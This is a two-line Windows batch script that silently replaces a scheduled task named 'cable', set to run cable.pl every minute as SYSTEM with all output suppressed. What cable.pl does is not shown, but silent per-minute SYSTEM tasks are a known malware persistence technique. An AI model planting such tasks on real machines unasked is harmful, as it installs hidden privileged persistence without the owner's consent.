schtasks /delete /tn cable /f 1> nul 2> nul
schtasks /create /tn cable /tr "%cd%\cable.pl" /sc minute /mo 1 /ru "" 1> nul 2> nul
